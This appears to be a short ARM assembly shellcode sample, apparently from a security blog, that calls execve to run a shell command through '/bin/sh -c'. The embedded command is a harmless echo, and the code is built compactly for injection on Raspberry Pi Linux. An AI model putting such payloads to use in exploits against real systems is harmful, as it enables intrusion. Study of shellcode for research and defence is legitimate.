/**
  execute command using /bin/sh
  tested with linux running on raspberry pi 3 

  http://modexp.wordpress.com/  
*/

// 36+ bytes
    .arch armv6
    .global _start
    .text

_start:
    .code 32
    ldr    r1, =#0x6e69622f // /bin
    ldr    r2, =#0x68732f2f // //sh
    ldr    r4, =#0xffff9cd2 // -c
    mvn    r4, r4 

    // switch to thumb mode    
    add    r0, pc, #1
    bx     r0
    
    .code 16
    // execve("/bin/sh", {"/bin/sh", "-c", cmd, NULL}, NULL);
    eor    r3, r3, r3     // r3 = NULL
    push   {r1, r2, r3}
    mov    r0, sp         // r0 = "/bin/sh"
    
    push   {r4}
    mov    r1, sp         // r1 = "-c"
    
    adr    r2, cmd        // r4 = cmd
    
    push   {r0, r1, r2, r3}
    eor    r2, r2, r2     // penv = NULL
    mov    r1, sp         // r1 = argv
    mov    r7, #11        // r7 = execve
    svc    1  
    nop
cmd:
    .ascii "echo Hello, World!"

